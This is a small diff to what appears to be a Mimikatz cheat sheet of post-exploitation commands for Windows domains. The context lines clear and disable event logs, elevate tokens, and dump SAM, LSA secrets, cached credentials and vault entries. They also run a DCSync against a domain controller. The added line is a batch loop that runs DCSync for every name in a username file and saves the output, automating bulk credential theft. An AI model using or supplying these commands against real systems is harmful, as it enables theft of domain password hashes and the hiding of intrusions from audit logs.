@@ -30,6 +30,6 @@ privilege::debug  event::drop event::clear
 privilege::debug token::elevate vault::cred vault::list lsadump::sam lsadump::secrets lsadump::cache token::revert
 
 privilege::debug lsadump::dcsync /domain:xx.local /user:admin (/dc:)
-
+for /f "tokens=1" %i in (username.txt) do @mimikatz.exe "lsadump::dcsync /user:%i /domain:localtest.com" exit >> info.txt
 
 
